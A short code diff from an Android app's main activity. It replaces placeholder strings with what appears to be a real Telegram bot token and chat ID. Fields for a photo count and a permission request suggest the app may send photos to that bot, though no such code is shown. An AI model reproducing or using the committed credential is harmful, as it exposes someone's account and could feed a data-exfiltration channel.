@@ -34,8 +34,8 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 100;
     
     // 🔴 YAHAN APNA BOT TOKEN AUR CHAT ID DALO 🔴
-    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
+    private static final String BOT_TOKEN = "8752046750:AAHvbZduTrLLSnsooFFjjruINTKlz5PAOdM";
+    private static final String CHAT_ID = "5851573541";
     
     private Button btnPermission, btnStart;
     private TextView txtPhotoCount, txtLog, txtProgress;
